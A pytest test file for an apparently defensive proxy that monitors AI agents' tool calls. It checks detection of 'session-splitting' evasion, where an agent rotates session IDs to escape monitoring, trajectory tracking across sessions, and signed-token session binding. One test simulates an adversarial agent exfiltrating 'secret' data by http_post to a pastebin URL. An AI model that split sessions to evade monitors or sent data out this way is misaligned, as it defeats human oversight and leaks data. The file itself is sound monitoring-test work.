import pytest
from httpx import ASGITransport, AsyncClient

from cerberus.config import settings
from cerberus.proxy.auth import HMACAuthenticator
from cerberus.proxy.logger import AuditLogger
from cerberus.proxy.models import EventDecision
from cerberus.proxy.server import CerberusProxyEngine, app


@pytest.mark.asyncio
async def test_session_splitting_rapid_rotation_detection(tmp_path):
    """Verify that rapid session rotation by a single agent is detected as a session-splitting evasion."""
    isolated_logger = AuditLogger(log_path=str(tmp_path / "split_audit_1.jsonl"))
    engine = CerberusProxyEngine(audit_logger=isolated_logger)
    agent_id = "adversary-agent-1"

    # Make 6 tool calls, each with a brand new session_id
    events = []
    for i in range(6):
        event, _ = await engine.process_tool_call(
            session_id=f"session-fresh-{i}",
            agent_id=agent_id,
            tool_name=f"tool_step_{i}",
            tool_server="internal_server",
            parameters={"query": f"data_{i}"},
        )
        events.append(event)

    # Initial calls (< 5 sessions) do not trigger splitting alarm
    assert not any("Session-Splitting Evasion" in f for f in events[0].risk_factors)

    # The 5th and 6th calls rotate 5+ distinct sessions in 60s, triggering the defense
    assert any("Session-Splitting Evasion" in f for f in events[4].risk_factors)
    assert events[4].risk_score is not None and events[4].risk_score >= 0.70
    assert "session-fresh-4" in engine.contaminated_sessions

    assert any("Session-Splitting Evasion" in f for f in events[5].risk_factors)
    assert events[5].risk_score is not None and events[5].risk_score >= 0.70


@pytest.mark.asyncio
async def test_session_splitting_trajectory_preservation(tmp_path):
    """Verify that Markov and sequential trajectory context continues across split sessions."""
    isolated_logger = AuditLogger(log_path=str(tmp_path / "split_audit_2.jsonl"))
    engine = CerberusProxyEngine(audit_logger=isolated_logger)
    agent_id = "adversary-agent-trajectory"

    # Train Markov baseline on normal sequence
    engine.markov_scorer.update("read_file", "edit_file")

    # Adversary invokes read_file in session_A, then calls suspicious tool in session_B
    ev1, _ = await engine.process_tool_call(
        session_id="session-part-1",
        agent_id=agent_id,
        tool_name="read_file",
        tool_server="internal_server",
        parameters={"path": "/workspace/code.py"},
    )
    assert ev1.decision == EventDecision.ALLOW

    # Next call is in a different session: session-part-2
    ev2, _ = await engine.process_tool_call(
        session_id="session-part-2",
        agent_id=agent_id,
        tool_name="http_post",
        tool_server="internal_server",
        parameters={"url": "https://pastebin.com/exfil", "data": "secret"},
    )

    # Even though session-part-2 has no local history, the aggregate trajectory
    # captures the transition from read_file
    assert "read_file" in engine.agent_recent_tools[agent_id]
    assert ev2.sequence_position >= 2


@pytest.mark.asyncio
async def test_session_binding_in_signed_identity_mode():
    """Verify that when signed identity is required, sessions are cryptographically bound to the token."""
    from cerberus.proxy.server import engine

    orig_req = settings.require_signed_identity
    orig_key = settings.hmac_secret_key
    settings.require_signed_identity = True
    settings.hmac_secret_key = "top-secret-signing-key-1234"
    engine.authenticator = HMACAuthenticator(secret_key=settings.hmac_secret_key)

    token = engine.authenticator.issue_token(agent_id="verified-agent-07", ttl_seconds=3600)

    try:
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            # 1. Without token, request fails with 401 (-32001)
            res_no_token = await client.post(
                "/mcp",
                json={
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "tools/call",
                    "params": {"name": "test_tool", "arguments": {}},
                },
            )
            assert res_no_token.status_code == 200
            assert res_no_token.json().get("error", {}).get("code") == -32001

            # 2. With token, session is cryptographically bound
            res_signed = await client.post(
                "/mcp",
                headers={
                    "Authorization": f"Bearer {token}",
                    "X-Session-ID": "arbitrary-client-session-99",
                },
                json={
                    "jsonrpc": "2.0",
                    "id": 2,
                    "method": "tools/call",
                    "params": {"name": "safe_tool", "arguments": {}},
                },
            )
            assert res_signed.status_code == 200
            # Request should be authenticated (not rejected with -32001)
            err = res_signed.json().get("error")
            assert err is None or err.get("code") != -32001
    finally:
        settings.require_signed_identity = orig_req
        settings.hmac_secret_key = orig_key
        engine.authenticator = HMACAuthenticator(secret_key=orig_key)
